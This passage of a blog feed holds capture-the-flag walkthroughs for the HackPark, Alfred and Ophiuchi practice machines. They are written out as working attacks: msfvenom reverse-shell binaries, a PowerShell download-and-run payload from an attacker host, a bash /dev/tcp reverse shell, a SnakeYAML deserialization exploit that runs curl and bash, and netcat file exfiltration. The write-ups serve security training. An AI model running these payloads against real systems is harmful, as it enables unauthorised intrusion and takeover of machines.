07/11/2021  05:13 AM    &lt;DIR&gt;          .
07/11/2021  03:14 AM    &lt;DIR&gt;          ..
07/11/2021  04:26 AM             3,502 46353.cs
07/11/2021  05:13 AM             7,168 rce.exe
07/11/2021  04:35 AM             3,505 PostView.ascx
               3 File(s)         22,367 bytes
               2 Dir(s)  15,207,469,056 bytes free
C:\Users\Public&gt;copy \\10.11.25.224\share\rce.exe
        1 file(s) copied.
</code></pre><p>Start a netcat listener and execute the binary in target machine.</p>
<pre><code>// on target machine
C:\Users\Public&gt;rce.exe
// on local machine
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/exploit]
‚îî‚îÄ$ nc -nvlp 8081
listening on [any] 8081 ...
connect to [10.11.25.224] from (UNKNOWN) [10.10.158.32] 49343
Microsoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.     
</code></pre><p>Now upload <code>winpeas</code> the same way and look for things which we can use to escalate our privileges.</p>
<p>Interesting find by winpeas. Windows Scheduler is running.</p>
<pre><code>Õπ Interesting Services -non Microsoft-
. . .
 Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths  
WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
. . .
Õπ Autorun Applications
 Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there)  
    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
    Key: WScheduler
    Folder: C:\Program Files (x86)\SystemScheduler
    FolderPerms: Everyone [WriteData/CreateFiles]
    File: C:\PROGRA~2\SYSTEM~1\WScheduler.exe /LOGON
    FilePerms: Everyone [WriteData/CreateFiles]
. . .
</code></pre><p>Upon further enumeration we find the current version of windows scheduler running i.e <code>5.12</code>. And the process named <code>message.exe</code> is starting and closing frequently.</p>
<pre><code>C:\Program Files (x86)\SystemScheduler&gt;type Readme.txt
type Readme.txt  
***System Scheduler Release Notes**                                            
System Scheduler Professional - Version 5.12
-------------------------------------------------
Fix: Not correctly detecting Administrators when UAC is disabled
Fix: Very rare bug where system scheduler waits for executed program to complete before processing next event                                                           
Fix: Minor bug with Tray-Icon not reappearing when changing security settings  
. . .
C:\Program Files (x86)\SystemScheduler\Events&gt;type 20198415519.INI_LOG.txt
type 20198415519.INI_LOG.txt
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)
08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
08/04/19 15:08:00,Event Started Ok, (Administrator)
08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)  
. . .
</code></pre><p>This version of scheduler is vulnerable due to insecure file permissions. We can rename the original file and replace it with our malicious file which will be executed by the process as <code>authority/system</code>. As you can see the file <code>message.exe</code> in the same directory is being executed.</p>
<pre><code> C:\Program Files (x86)\SystemScheduler&gt;dir
 Directory of C:\Program Files (x86)\SystemScheduler   
07/11/2021  03:30 AM             1,496 LogFile.txt
07/11/2021  03:31 AM             3,760 LogfileAdvanced.txt
03/25/2018  10:58 AM           536,992 Message.exe
. . .  
</code></pre><p>First create the malicious file with name <code>message.exe</code> and transfer it to target machine. We will rename the original file and replace it with our malicious file instead.</p>
<pre><code>// on local machine
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/exploit]
‚îî‚îÄ$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o Message.exe LHOST=10.11.25.224 LPORT=8082
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: Message.exe

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/exploit]
‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

// on target machine
/// rename the file
C:\Program Files (x86)\SystemScheduler&gt;ren Message.exe Message.bak
ren Message.exe Message.bak  

/// download the file to target machine
C:\Program Files (x86)\SystemScheduler&gt;copy \\10.11.25.224\share\Message.exe
copy \\10.11.25.224\share\Message.exe1 file(s) copied.
</code></pre><p>Now just start a netcat listener and wait for the process to executed our malicious file which will give us reverse shell as root.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/hackpark/scans]
‚îî‚îÄ$ nc -nvlp 8082
listening on [any] 8082 ...
connect to [10.11.25.224] from (UNKNOWN) [10.10.158.32] 49403
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Users\Administrator&gt;whoami
whoami
hackpark\administrator
C:\Users\jeff\Desktop&gt;type user.txt
type user.txt
759bd8af507517bcfaede78a21a73e39
C:\Users\Administrator&gt;type Desktop\root.txt
type Desktop\root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72  
</code></pre>]]></content>
        </item>
        
        <item>
            <title>THM | Alfred | Walkthrough</title>
            <link>https://imtodess.github.io/posts/2021/07/thm-alfred-walkthrough/</link>
            <pubDate>Sun, 11 Jul 2021 10:24:04 +0545</pubDate>
            
            <guid>https://imtodess.github.io/posts/2021/07/thm-alfred-walkthrough/</guid>
            <description>Exploitation Guide For Alfred Summary In this room, we&amp;rsquo;ll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we&amp;rsquo;ll use an interesting privilege escalation method to get full system access.
Enumeration Service Enumeration using Nmap First we will do a quick scan to see which services are running on the target machine.</description>
            <content type="html"><![CDATA[<h2 id="exploitation-guide-for-alfred">Exploitation Guide For Alfred</h2>
<h3 id="summary">Summary</h3>
<p>In this room, we&rsquo;ll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we&rsquo;ll use an interesting privilege escalation method to get full system access.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="service-enumeration-using-nmap">Service Enumeration using Nmap</h3>
<p>First we will do a quick scan to see which services are running on the target machine.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/alfred]
‚îî‚îÄ$ nmap $ip -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 10:06 EDT
Nmap scan report for 10.10.145.45
Host is up (0.19s latency).

PORT     STATE SERVICE
80/tcp   open  http  
3389/tcp open  ms-wbt-server
8080/tcp open  http
</code></pre><p>Now we will do comprehensive scans on three ports we found from quick scan.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/alfred]
‚îî‚îÄ$ sudo nmap -p 80,3389,8080 -sSCV $ip -oN nmap_initial.txt -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 10:06 EDT
Nmap scan report for 10.10.145.45
Host is up (0.19s latency).

PORT     STATE SERVICE        VERSION
80/tcp   open  http           Microsoft IIS httpd 7.5
| http-methods:  
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ms-wbt-server?
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2021-07-08T13:51:33
|_Not valid after:  2022-01-07T13:51:33
|_ssl-date: 2021-07-09T14:08:04+00:00; -1s from scanner time.
8080/tcp open  http           Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry  
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.34 seconds
</code></pre><h3 id="web-enumeration">Web Enumeration</h3>
<p>We have HTTP services running on two ports i.e <code>80</code> and <code>8080</code>. On visiting web instance at port <code>8080</code> we are greeted by the login page.
<img src="/img/alfred/jenkins.png" alt="">
After some enumeration and trying default/common credentials we find out that the login credential is <code>admin:admin</code>.</p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="initial-exploit">Initial exploit</h3>
<p>Since we are authenticated, we can exploit this jenkins instance in various ways to obtain a shell. In this walkthrough we will be exploiting the common misconfiguration on automation server using one of the tools from <a href="https://github.com/samratashok/nishang">samratok/nishang</a>.</p>
<p>First we will create a new freestyle project ( Freestyle project is a project in which you can run any types of build.)
<img src="/img/alfred/jenkins1.png" alt="">
Now lets configure it to run batch command.
<img src="/img/alfred/jenkins2.png" alt="">
We will put our malicious command here which when executed will give us the reverse shell.
<img src="/img/alfred/jenkins3.png" alt=""></p>
<p>Payload :</p>
<pre><code>powershell iex (New-Object Net.WebClient).DownloadString('http://&lt;your-ip&gt;/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress &lt;your-ip&gt; -Port &lt;your-port&gt;
</code></pre><p>For this payload to work we need to host http server on the directory where <code>Invoker-powersheltcp.ps1</code> is located.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows/nishang/Shells]
‚îî‚îÄ$ ls
Invoke-ConPtyShell.ps1               Invoke-PowerShellTcp.ps1
Invoke-JSRatRegsvr.ps1               Invoke-PowerShellUdpOneLine.ps1
Invoke-JSRatRundll.ps1               Invoke-PowerShellUdp.ps1
Invoke-PoshRatHttp.ps1               Invoke-PowerShellWmi.ps1
Invoke-PoshRatHttps.ps1              Invoke-PsGcatAgent.ps1
Invoke-PowerShellIcmp.ps1            Invoke-PsGcat.ps1
Invoke-PowerShellTcpOneLineBind.ps1  Remove-PoshRat.ps1
Invoke-PowerShellTcpOneLine.ps1

‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows/nishang/Shells]
‚îî‚îÄ$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre><p>Start a <code>netcat</code> listener to receive the shell.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/alfred/exploit]
‚îî‚îÄ$ nc -nvlp 8080
listening on [any] 8080 ...
</code></pre><p>Then execute the payload by building the project. We will get our initial shell.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/alfred/exploit]
‚îî‚îÄ$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [10.11.25.224] from (UNKNOWN) [10.10.145.45] 49225
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\rce&gt;whoami
alfred\bruce
PS C:\Program Files (x86)\Jenkins\workspace\rce&gt; cd C:\Users\bruce\Desktop
PS C:\Users\bruce\Desktop&gt; type user.txt
79007a09481963edf2e1321abd9ae2a0
</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
<p>From the initial exploit we will get the shell as user <code>bruce</code> which doesn&rsquo;t have much privileges. So we will escalate our privilege to <code>Root</code> i.e <code>(authority/system)</code>. To do this we will be exploiting one of the common misconfiguration in windows i.e Token access. You can enumerate the box for privilege escalation using <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">Winpeas</a>.
We will do manual Enumeration for this walkthrough.</p>
<pre><code>PS C:\Users&gt; whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                  Description                               State    
=============================== ========================================= ========
. . .
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled  
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled  
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled  
SeCreateGlobalPrivilege         Create global objects                     Enabled  

. . .
</code></pre><p>As you can see <code>SeImpersonatePrivilege</code> is enabled. We will be exploiting this using <code>incognito</code> module.
You can get the incognito from <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">here</a>.</p>
<p>Now we will transfer the module to target machine using <code>smb</code>.
First we will start <code>smbserver</code> in the directory containing the module.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows/incognito2]

‚îî‚îÄ$ ls
child_process.c       incognito.c            remote_connection.c
child_process.h       incognito.exe          remote_connection.h
. . .                                                                                     

‚îå‚îÄ‚îÄ(kali„âøkali)-[/opt/windows/incognito2]

‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .     
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre><p>Download the binary in target machine.</p>
<pre><code>PS C:\Users\bruce\Desktop&gt; copy \\10.11.25.224\share\incognito.exe   
PS C:\Users\bruce\Desktop&gt; dir
Mode                LastWriteTime     Length Name                               
----                -------------     ------ ----                               
-a---         7/18/2012   7:12 PM     102912 incognito.exe                                   
-a---        10/25/2019  11:22 PM         32 user.txt   
</code></pre><p>For easy exploitation we can just create a user with high level privilege using the incognito module and <code>RDP</code> into the target machine.</p>
<pre><code>// Create user
PS C:\Users\bruce\Desktop&gt; ./incognito.exe add_user root root                                               
[-] WARNING: Not running as SYSTEM. Not all tokens will be available
[*] Enumerating tokens                              
[*] Attempting to add user root to host 127.0.0.1
[+] Successfully added user                                                             

// Now add the user to Administrators group                
PS C:\Users\bruce\Desktop&gt; ./incognito.exe add_localgroup_user Administrators root                 
[-] WARNING: Not running as SYSTEM. Not all tokens will be available.                   
[*] Enumerating tokens                          
[*] Attempting to add user root to local group Administrators on host 127.0.0.1                               
[+] Successfully added user to local group     
</code></pre><p>Just login using rdp with the user you created and get the sweet root flag.</p>
<pre><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/ctf/thm/alfred/exploit]
‚îî‚îÄ$ rdesktop -g 90% -u root -p root 10.10.145.45   
</code></pre><p><img src="/img/alfred/jenkins5.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>HTB | Ophiuchi | Walkthrough</title>
            <link>https://imtodess.github.io/posts/2021/07/htb-ophiuchi-walkthrough/</link>
            <pubDate>Thu, 08 Jul 2021 18:52:03 +0545</pubDate>
            
            <guid>https://imtodess.github.io/posts/2021/07/htb-ophiuchi-walkthrough/</guid>
            <description>Exploitation Guide for¬†Ophiuchi Summary: In this box, we will be exploiting yaml parsing (deserialization) vulnerability to get RCE¬†. Then exploit the misconfigured sudo privilege to gain the root shell.
Enumeration Nmap ‚îå‚îÄ‚îÄ(rootüíÄkali)-[/home/‚Ä¶/ctf/htb/ophiuchi/scans] ‚îî‚îÄ# nmap -sS -sV -T4 -p- -A 10.10.10.227 -oN nmap_full_syn.txt Starting Nmap 7.91 ( &amp;lt;https://nmap.org&amp;gt; ) at 2021-06-04 22:09 EDT Stats: 0:11:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 60.</description>
            <content type="html"><![CDATA[<h2 id="exploitation-guide-forophiuchi">Exploitation Guide for¬†Ophiuchi</h2>
<h3 id="summary">Summary:</h3>
<p>In this box, we will be exploiting yaml parsing (deserialization) vulnerability to get RCE¬†. Then exploit the misconfigured sudo privilege to gain the root shell.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">Nmap</h3>
<pre><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[/home/‚Ä¶/ctf/htb/ophiuchi/scans]
‚îî‚îÄ# nmap -sS -sV -T4 -p- -A 10.10.10.227 -oN nmap_full_syn.txt
Starting Nmap 7.91 ( &lt;https://nmap.org&gt; ) at 2021-06-04 22:09 EDT
Stats: 0:11:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.21% done; ETC: 22:28 (0:07:30 remaining)
Stats: 0:11:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.23% done; ETC: 22:28 (0:07:30 remaining)
Stats: 0:11:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.27% done; ETC: 22:27 (0:07:29 remaining)
Nmap scan report for 10.10.10.227
Host is up (0.19s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
</code></pre><h3 id="web-enumeration">Web Enumeration</h3>
<p>Simple Web app (YAML parser ) in port 8080.
<img src="/img/ophiuchi/webpage.png" alt=""></p>
<p>Look for YAML parsing vulnerabilities. Below is the resource I found helpful.</p>
<p><a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">snakeyaml-deserialization</a></p>
<p><a href="https://github.com/mbechler/marshalsec">mbechler/marshalsec</a></p>
<p>We will be exploiting this deserialization vulnerability to get RCE.
Payload we are going to use.</p>
<p><a href="https://github.com/artsploit/yaml-payload">artsploit/yaml-payload</a></p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="initial-exploitation">Initial Exploitation</h3>
<p>According to the exploit we can execute system commands on target machine using the Runtime.getRuntime().exec(). So we will create our own bash script which will give us Reverse shell when executed.
Create bash script <code>revshell.sh</code> with following content.</p>
<pre><code>#!/bin/sh
bash -i &gt;&amp; /dev/tcp/10.10.16.47/4444 0&gt;&amp;1
## modify the ip and port according to your needs
</code></pre><p>Then start a http server where the script it located. I used python to do this.</p>
<pre><code>python -m SimpleHTTPServer 80
</code></pre><p>Now We will modify the exploit so it will download our malicious script to the target machine and execute it. Modified part is in BOLD.</p>
<pre><code>package artsploit;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec(&quot;curl &lt;http://10.10.16.47/revshell.sh&gt; -o /tmp/revshell.sh&quot;);
            Runtime.getRuntime().exec(&quot;bash /tmp/revshell.sh&quot;);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
  ...
  ...
</code></pre><p>Now since we added the command we want to execute in target machine, we use the following commands to compile and get our payload jar file.</p>
<pre><code>cd yaml-payload
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
</code></pre><p>Finally insert the following YAML piece into the web parser to get RCE. Also start a netcat listener on the port you chose earlier.</p>
<pre><code>!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL [&quot;&lt;http://10.10.16.47/yaml-payload.jar&gt;&quot;]
  ]]
]
</code></pre><p><img src="/img/ophiuchi/webpage2.png" alt=""></p>
<p>Simple http server using python
<img src="/img/ophiuchi/webpage3.png" alt=""></p>
<p>Netcat listener to receive the shell.
<img src="/img/ophiuchi/webpage4.png" alt=""></p>
<p>We will get the shell as user tomcat
<img src="/img/ophiuchi/webpage5.png" alt=""></p>
<p>If we search for user flag. We see that its on <code>/home/admin/user.txt</code>¬†. We don&rsquo;t have any permission to access it. So lets find a way to escalate our privilege to user <code>admin</code>.
<img src="/img/ophiuchi/webpage6.png" alt="">
After some enumeration I found the <code>tomcat-users.xml</code> file in which credential of user <code>admin</code> was written in plain text. The file is at <code>/opt/tomcat/conf</code>.
<img src="/img/ophiuchi/webpage7.png" alt="">
Now that we have the credential we can ssh into the machine and grab that sweet user flag.
<img src="/img/ophiuchi/webpage8.png" alt=""></p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>Run <code>sudo -l</code> to see if current user any <code>sudo</code> privileges. Seems like user admin can run /<code>usr/bin/go run /opt/wasm-functions/index.go</code> as root without any password.
<img src="/img/ophiuchi/webpage9.png" alt="">
Check the content of the file.</p>
<pre><code>## Content of index.go
package main
import (
        &quot;fmt&quot;
        wasm &quot;github.com/wasmerio/wasmer-go/wasmer&quot;
        &quot;os/exec&quot;
        &quot;log&quot;
)
func main() {
        bytes, _ := wasm.ReadBytes(&quot;main.wasm&quot;)
        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports[&quot;info&quot;]
        result,_ := init()
        f := result.String()
        if (f != &quot;1&quot;) {          &lt;==========================================
                fmt.Println(&quot;Not ready to deploy&quot;)
        } else {
                fmt.Println(&quot;Ready to deploy&quot;)
                out, err := exec.Command(&quot;/bin/sh&quot;, &quot;deploy.sh&quot;).Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
</code></pre><p>Here, we see that, functions and variables are imported from the <code>main.wasm</code> file and checking the value of the variable <code>f</code>, if it equals <code>1</code> we get ready to deploy and execute <code>/bin/sh deploy.sh</code>.</p>
<p>They are importing values from <code>main.wasm</code> and executing <code>deploy.sh</code> whose absolute path is not defined. So we can manipulate these. These files will be read from our current working directory, from where we run the <code>index.go</code> file.
Create the directory in <code>/tmp</code>. And copy the <code>main.wasm</code>.
<img src="/img/ophiuchi/webpage10.png" alt="">
Create our own <code>deploy.sh</code> and add the command which will give us the shell as root. I will be changing the permission of <code>/bin/bash</code>.
<img src="/img/ophiuchi/webpage11.png" alt="">
Now if you run the command¬†. We will get <code>not ready to deploy</code> message.
<img src="/img/ophiuchi/webpage12.png" alt="">
This means the variable <code>f</code> is not equal to <code>1</code> in wasm file. We need to change this value.
The text readable format of WASM binary is WAT(Web Assembly Text). We can manipulate the value of <code>f</code> editing the wasm file in this format. So we will change our file format from wasm to wat. To do that lets transfer the file to our machine first. I am using netcat to do that.
<img src="/img/ophiuchi/webpage14.png" alt="">
<img src="/img/ophiuchi/webpage13.png" alt=""></p>
<pre><code># Here's the command
cat main.wasm | nc {your-ip} {your-port}   (on target)
nc -lnvp {your-port} &gt; main.wasm           (on local)
</code></pre><p>Now lets convert it to wat¬†. You can do it using wabt. You can download in kali using apt install wabt¬†. You can also download and compile the binary from here:
<a href="https://github.com/webassembly/wabt">WebAssembly/wabt</a></p>
<p>After converting the wasm file we can see the following. we see that the value of f is a 0, we need to change it to 1.
<img src="/img/ophiuchi/webpage15.png" alt="">
Edit using any text editor. After changing the value convert it to wasm again using wat2wasm.
<img src="/img/ophiuchi/webpage16.png" alt=""></p>
<p>| Extra:
If you dont want to do this. You can copy the following line to the site mentioned below and download the wasm file.
<a href="https://webassembly.github.io/wabt/demo/wat2wasm/index.html">wat2wasm demo</a></p>
<pre><code>    (type (;0;) (func (result i32)))
    (func $info (type 0) (result i32)
      i32.const 1)
    (table (;0;) 1 1 funcref)
    (memory (;0;) 16)
    (global (;0;) (mut i32) (i32.const 1048576))
    (global (;1;) i32 (i32.const 1048576))
    (global (;2;) i32 (i32.const 1048576))
    (export &quot;memory&quot; (memory 0))
    (export &quot;info&quot; (func $info))
    (export &quot;__data_end&quot; (global 1))
    (export &quot;__heap_base&quot; (global 2)))
</code></pre><p>Now transfer the file to target machine. Remove the previous wasm file before transferring to prevent any errors. I am using scp to transfer the file.
<img src="/img/ophiuchi/webpage17.png" alt="">
Now we have everything ready. Just execute the command and our privilege will be escalated to root. As you can see we get <code>ready to deploy</code> message. This means it also executed our malicious <code>deploy.sh</code> script.
<img src="/img/ophiuchi/webpage18.png" alt=""></p>
<p>Since I changed the permission of <code>/bin/bash</code> I can just do <code>/bin/bash -p</code> and I will get the shell as root.
<img src="/img/ophiuchi/webpage19.png" alt=""></p>
]]></content>
        </item>
        
    </channel>
</rss>
